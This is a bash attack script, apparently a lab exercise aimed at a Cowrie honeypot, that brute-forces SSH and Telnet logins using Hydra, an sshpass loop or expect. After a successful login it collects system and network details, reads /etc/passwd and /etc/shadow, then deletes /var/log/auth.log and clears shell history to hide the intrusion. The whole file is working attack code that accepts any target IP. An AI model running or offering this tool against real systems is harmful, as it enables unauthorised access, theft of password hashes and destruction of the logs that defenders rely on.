#!/bin/bash

# 1. FORMATTING & INTRODUCTION
bold="\033[1m"
boldend="\033[0m"
echo
echo -e "${bold}Welcome to SSH_Telnet_Attacker™ by Keith Tan!${boldend}"
echo
printf "	[?] What is your name? "; read name
echo "	[#] Welcome $name!"
echo
echo


# 2. DEFINE TARGET, USERNAME & PASSWORD LIST
echo -e "${bold}DEFINING TARGET...${boldend}"
echo
IP_regex="^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$"

echo "	[?] State the target IP address you want to scan..."
while true; do #prompt user to input target's IP address, then validate it
    read -p "	[?] Enter an IP Address to scan: " IP_addr
    if [[ $IP_addr =~ $IP_regex ]]; then
        break  #exit loop if IP address is valid
    else
        echo "	[!] Invalid IP address of $IP_addr, please re-enter a valid IP address."
    fi
done
echo -e "	${bold}[@] Your target IP address is: $IP_addr${boldend}"

read -p "	[?] Specify full file path of your username list:" userlist
read -p "	[?] Specify full file path of your password list:" passlist
user_found=""
pw_found=""
echo


# 3A. CHECK FOR REQUIRED INSTALLATIONS
function install_sshpass() { # installing sshpass (to automate ssh into remote server)
	if ! command -v sshpass &> /dev/null
	then
		echo "	[!] sshpass is not installed. Installing sshpass now..."
		if sudo apt-get install -y sshpass > /dev/null; then
			echo "	[#] sshpass is successfully installed."
		else
			echo "	[Error] Failed to install sshpass."
		fi
	else
		echo "	[#] sshpass is already installed."
	fi
}


# 3B. DEFINE ATTACKS
	# ATTACK ONE: HYDRA - SSH BRUTEFORCE
function hydra_sshattack() {
	echo "	[#] Using Hydra to SSH Bruteforce..."
	install_sshpass
	
	read -p "	[?] Specify full directory file path to store output:" sshhydraout
	echo "	[#] SSH Hydra Bruteforcing now..."

	hydra -L $userlist -P $passlist $IP_addr ssh -o ${sshhydraout}/hydrasshbruteforce.txt > /dev/null 2>&1
		#check if login successful
	if grep -iq "password:" "${sshhydraout}/hydrasshbruteforce.txt"; then #if the hydra output file contains string 'password:'...
		user_found=$(grep -o 'login: .*' ${sshhydraout}/hydrasshbruteforce.txt | cut -d' ' -f2)
		pw_found=$(grep -o 'password: .*' ${sshhydraout}/hydrasshbruteforce.txt | cut -d' ' -f2)
		echo -e "	${bold}[!] Bruteforce successful. Weak credentials found: $user_found : $pw_found${boldend}" #echo to user in terminal
		echo "$(date) [!] Bruteforce successful. Weak credentials found: $user_found : $pw_found" >> ${sshhydraout}/hydrasshbruteforce.txt #add to output file
	else
		echo "	[@] Bruteforce completed. No weak passwords were detected." #echo to user in terminal
		echo "$(date) [@] Bruteforce completed. No weak passwords were detected." >> ${sshhydraout}/hydrasshbruteforce.txt #add to output file
	fi
	echo

	#use SSHpass to enter target (Cowrie) and execute commands:
	echo "	[*] Connecting via SSH & Running Commands within Target..."
	echo "	[*] Printing Results..."
	echo
	sshpass -p "$pw_found" ssh "$user_found@$IP_addr" "\
	echo -e '\033[1m1. MACHINE INFO:\033[0m'; whoami; id; uname -a; echo; \
	echo -e '\033[1m2. NETWORK INFO:\033[0m'; ifconfig; netstat -tapn; echo; \
	echo -e '\033[1m3. CONFIG FILES (/etc)\033[0m'; cd /etc && ls; echo; \
	echo -e '\033[1m4. /etc/passwd\033[0m'; cat /etc/passwd; echo; \
	echo -e '\033[1m5. /etc/shadow\033[0m'; cat /etc/shadow; echo; \
	rm -f /var/log/auth.log; \
	history -c"

	echo "	[!] Commands executed, logs cleared. Disconnected from Target."
}

	# ATTACK TWO: FOR-LOOP - SSH BRUTEFORCE
function forloopsshbrute () {
	echo -e "	[#] Using For-Loop to SSH Bruteforce..."
	echo
	install_sshpass
	IFS=$'\n' 	# Set IFS to newline to handle usernames and passwords with spaces correctly

	function try_ssh { #attempt SSH with username and password
		local user=$1
		local password=$2
		echo "	[@] Trying username: $user and password: $password"
		sshpass -p "$password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "$user@$IP_addr" "exit" > /dev/null 2>&1
	}

	for USER in $(cat "$userlist"); do #iterate over each username in the userlist
		for PASSWORD in $(cat "$passlist"); do #iterate over each password in the passlist
			try_ssh "$USER" "$PASSWORD"
			if [ $? -eq 0 ]; then
				echo -e "	${bold}[!] Credentials found - $USER:$PASSWORD${boldend}"
				user_found=$USER
				pw_found=$PASSWORD
				
				#use SSHpass to enter target (Cowrie) and execute commands:
				echo
				echo "	[*] Connecting via SSH & Running Commands within Target..."
				echo "	[*] Printing Results..."
				echo
				sshpass -p "$pw_found" ssh -o StrictHostKeyChecking=no "$user_found@$IP_addr" "\
					echo -e '\033[1m1. MACHINE INFO:\033[0m'; whoami; id; uname -a; echo; \
					echo -e '\033[1m2. NETWORK INFO:\033[0m'; ifconfig; netstat -tapn; echo; \
					echo -e '\033[1m3. CONFIG FILES (/etc)\033[0m'; cd /etc && ls; echo; \
					echo -e '\033[1m4. /etc/passwd\033[0m'; cat /etc/passwd; echo; \
					echo -e '\033[1m5. /etc/shadow\033[0m'; cat /etc/shadow; echo; \
					rm -f /var/log/auth.log; \
					history -c"
				
				echo "	[!] Commands executed, logs cleared. Disconnected from Target."	
				break 2
			fi
		done
	done
	unset IFS
}

	# ATTACK THREE: 'EXPECT' - TELNET BRUTEFORCE
function expect_telnetattack() {
	echo -e "	[#] Using Expect module to Telnet Bruteforce..."
	read -p "	[?] Specify full directory file path to store output:" telnetbruteout

	for un in $(cat $userlist); do
	  for pw in $(cat $passlist); do
		echo "Trying username: $un and password: $pw"

		# Use 'expect' to attempt Telnet login
		result=$(/usr/bin/expect <<EOF
set timeout 5
spawn telnet $IP_addr
expect "login: " { send "$un\r" }
expect "Password: " { send "$pw\r" }
expect {
	"Login incorrect" { exit 1 }
	"$ " { exit 0 }
	timeout { exit 1 }
}
EOF
)
		if [ $? -eq 0 ]; then
			user_found=$un
			pw_found=$pw
			break 2
		fi
	  done
	done

	if [ -n "$user_found" ] && [ -n "$pw_found" ]; then
		echo -e "	${bold}[!] Bruteforce successful. Weak credentials found: $user_found : $pw_found${boldend}" #echo to user in terminal
		echo "$(date) [!] Bruteforce successful. Weak credentials found: $user_found : $pw_found" >> ${telnetbruteout}/telnetattack.txt #add to output file
		
		#use 'expect' to enter Telnet of target (Cowrie) and execute commands:
		echo "	[*] Connecting via Telnet & Running Commands within Target..."
		echo "	[*] Printing Results..."
		/usr/bin/expect <<EOF
set timeout 5
spawn telnet $IP_addr
expect "login: " { send "$user_found\r" }
expect "Password: " { send "$pw_found\r" }

expect "$ " { send "echo\r" }
expect "$ " { send "echo '1. MACHINE INFO'\r" }
expect "$ " { send "whoami\r" }
expect "$ " { send "id\r" }
expect "$ " { send "uname -a\r" }

expect "$ " { send "echo\r" }
expect "$ " { send "echo '2. NETWORK INFO'\r" }

expect "$ " { send "echo\r" }
expect "$ " { send "echo '3. CONFIG FILES'\r" }
expect "$ " { send "ifconfig\r" }
expect "$ " { send "netstat -tapn\r" }
expect "$ " { send "cd /etc && ls\r" }

expect "$ " { send "echo\r" }
expect "$ " { send "echo '4. /etc/passwd'\r" }
expect "$ " { send "cat /etc/passwd\r" }

expect "$ " { send "echo\r" }
expect "$ " { send "echo '5. /etc/shadow'\r" }
expect "$ " { send "cat /etc/shadow\r" }
expect "$ " { send "rm -f /var/log/auth.log\r" }
expect "$ " { send "history -c\r" }
expect "$ " { send "exit\r" }
expect eof
EOF
	else
		echo "	[@] Bruteforce completed. No weak passwords were detected." #echo to user in terminal
		echo "[@] Bruteforce completed. No weak passwords were detected." >> ${telnetbruteout}/telnetattack.txt #add to output file
	fi
}


# STAGE 4: ATTACK TARGET
echo
echo
echo -e "${bold}DEFINE ATTACK & ATTACK TARGET...${boldend}"
echo "	[?] Choose an attack to use on the target: (A) Hydra SSH Bruteforce | (B) For-Loop SSH Bruteforce | (C) 'expect' Telnet Bruteforce"
read attackchoice
case $attackchoice in
	A|a)
		hydra_sshattack
		;;
	B|b)
		forloopsshbrute
		;;
	C|c)
		expect_telnetattack
		;;
	*)
		echo "	[!] Invalid input, please choose either 'A', 'B' or 'C'."
		continue #re-prompt user to choose a valid option
		;;
esac






